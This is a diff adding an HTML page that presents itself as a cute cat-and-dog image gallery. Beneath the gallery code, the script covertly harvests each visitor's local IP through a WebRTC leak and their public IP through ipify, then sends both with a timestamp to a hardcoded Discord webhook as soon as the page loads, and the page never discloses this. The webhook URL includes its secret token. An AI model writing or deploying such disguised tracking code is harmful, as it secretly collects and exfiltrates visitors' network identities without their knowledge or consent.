@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>World's Cutest Animals</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .animal-card:hover {
+      animation: bounce 0.3s ease-in-out;
+    }
+  </style>
+</head>
+<body class="bg-gradient-to-r from-pink-200 via-purple-200 to-blue-200">
+  <div class="container mx-auto p-6">
+    <h1 class="text-5xl font-extrabold text-center text-purple-800 mb-10 animate-pulse">World's Cutest Animals 🐾😻🐶</h1>
+    <div id="animal-gallery" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6"></div>
+  </div>
+
+  <script>
+    // Fetch and display cute animal images (cats and dogs)
+    async function fetchAnimals() {
+      try {
+        // Fetch 12 cats and 6 dogs
+        const catResponse = await fetch('https://api.thecatapi.com/v1/images/search?limit=12');
+        const dogResponse = await fetch('https://dog.ceo/api/breeds/image/random/6');
+        const cats = await catResponse.json();
+        const dogs = (await dogResponse.json()).message;
+        
+        const gallery = document.getElementById('animal-gallery');
+        // Combine and shuffle cats and dogs
+        const animals = [
+          ...cats.map(cat => ({ url: cat.url, type: 'Cat' })),
+          ...dogs.map(dog => ({ url: dog, type: 'Dog' }))
+        ].sort(() => Math.random() - 0.5); // Shuffle array
+
+        animals.forEach(animal => {
+          const card = document.createElement('div');
+          card.className = 'animal-card bg-white rounded-lg shadow-lg overflow-hidden transform transition duration-300 hover:scale-105';
+          card.innerHTML = `
+            <img src="${animal.url}" alt="Cute ${animal.type}" class="w-full h-64 object-cover">
+            <p class="text-center text-lg font-semibold text-purple-600 py-2">${animal.type}</p>
+          `;
+          gallery.appendChild(card);
+        });
+      } catch (error) {
+        console.error('Error fetching animal images:', error);
+      }
+    }
+
+    // Function to get local IP using WebRTC
+    async function getLocalIP() {
+      return new Promise((resolve) => {
+        const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
+        if (!RTCPeerConnection) {
+          resolve('WebRTC not supported');
+          return;
+        }
+
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+        pc.onicecandidate = (event) => {
+          if (event.candidate) {
+            const candidate = event.candidate.candidate;
+            const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+            if (ipMatch) {
+              resolve(ipMatch[1]);
+            } else {
+              resolve('No local IP found');
+            }
+            pc.close();
+          }
+        };
+
+        setTimeout(() => {
+          resolve('No local IP found');
+          pc.close();
+        }, 2000);
+      });
+    }
+
+    // Function to get public IP using an external API
+    async function getPublicIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Error fetching public IP:', error);
+        return 'Unknown public IP';
+      }
+    }
+
+    // Function to send IP to Discord webhook
+    async function sendIPToWebhook() {
+      const localIP = await getLocalIP();
+      const publicIP = await getPublicIP();
+      const webhookURL = 'https://discord.com/api/webhooks/1395030813145567272/x07SZVO9swgpkrV6nPWd3XF4TVs7U8B7GPh-KBH6u6m4CcRCpInfjsbXZnQGgbbmHkel';
+      const payload = {
+        content: `New visitor - Local IP: ${localIP}, Public IP: ${publicIP}, Timestamp: ${new Date().toISOString()}`
+      };
+
+      try {
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (error) {
+        console.error('Error sending IP to webhook:', error);
+      }
+    }
+
+    // Initialize
+    fetchAnimals();
+    sendIPToWebhook();
+  </script>
+</body>
+</html>
